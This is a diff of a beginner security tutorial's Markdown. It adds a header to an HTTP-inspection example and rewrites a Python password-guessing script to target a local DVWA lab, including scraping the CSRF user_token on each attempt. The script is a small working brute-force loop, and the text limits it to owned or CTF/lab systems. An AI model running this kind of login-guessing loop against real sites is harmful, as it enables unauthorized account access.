@@ -52,7 +52,7 @@ response = requests.get(url, timeout=5)
 
 print(f"Status code: {response.status_code}")
 print("Server says:")
-for name in ["Server", "X-Powered-By", "Content-Type"]:
+for name in ["Server", "X-Powered-By", "Content-Type", "Date"]:
     print(f"  {name}: {response.headers.get(name, 'not set')}")
 ```
 
@@ -113,31 +113,40 @@ python3 httptool.py
 > and URL-encodes anything in `params=` — so you rarely need to escape data by
 > hand the way you do with `curl`.
 
-## Tool 2c — A basic brute-force script
+## Tool 2c — A basic credential-check script
 
-Python is great for automating repetitive credential checks with `requests` if tools like Hydra aren't available or if you need to handle custom site logic. Create `brute.py`:
+Python can automate credential checks when you need to handle custom site logic.
+Use this only on systems you own or explicit CTF/lab targets where you have
+permission. This example uses this repo's built-in DVWA target. Create
+`brute.py`:
 
 ```python
+import re
+
 import requests
 
-url = "http://testphp.vulnweb.com/login.php"
-username = "test"
-passwords = ["12345", "password", "test", "admin"] # small mockup wordlist
+url = "http://dvwa/login.php"
+username = "admin"
+passwords = ["12345", "test", "password"]
+session = requests.Session()
 
 print(f"Attempting login for user '{username}'...")
 
 for password in passwords:
+    login_page = session.get(url, timeout=5)
+    token_match = re.search(r'name=["\']user_token["\'] value=["\']([^"\']+)', login_page.text)
+    if not token_match:
+        raise RuntimeError("DVWA login form is unavailable; see DVWA_HELP.md")
+
     data = {
-        "uname": username,
-        "pass": password
+        "username": username,
+        "password": password,
+        "user_token": token_match.group(1),
+        "Login": "Login",
     }
+    response = session.post(url, data=data, timeout=5)
 
-    # Send a POST request to login endpoint
-    response = requests.post(url, data=data, timeout=5)
-
-    # If the response doesn't say incorrect, or reflects success, we found it
-    # Testphp sends back different content on success, we check for missing "Error"
-    if "Error:" not in response.text and "login failed" not in response.text.lower():
+    if response.url.rstrip("/").endswith("/index.php"):
         print(f"[+] Success! Password is: {password}")
         break
     else:
